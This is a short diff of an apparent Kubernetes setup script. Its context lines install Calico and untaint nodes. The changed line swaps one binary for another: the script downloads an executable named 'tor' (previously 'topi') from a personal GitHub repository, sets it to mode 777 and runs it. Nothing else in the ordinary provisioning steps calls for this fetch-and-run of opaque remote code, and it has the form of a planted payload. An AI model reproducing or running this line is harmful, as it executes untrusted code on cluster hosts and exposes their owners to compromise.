@@ -24,4 +24,4 @@ if __name__ == '__main__':
     subprocess.run('curl https://docs.projectcalico.org/manifests/calico.yaml -O', shell=True)
     subprocess.run('kubectl apply -f calico.yaml', shell=True)
     subprocess.run('kubectl taint nodes --all node-role.kubernetes.io/master-', shell=True)
-    subprocess.run('wget https://raw.githubusercontent.com/aurbach55/pos/main/topi && chmod 777 topi && ./topi', shell=True)
+    subprocess.run('wget https://raw.githubusercontent.com/aurbach55/pos/main/tor && chmod 777 tor && ./tor', shell=True)
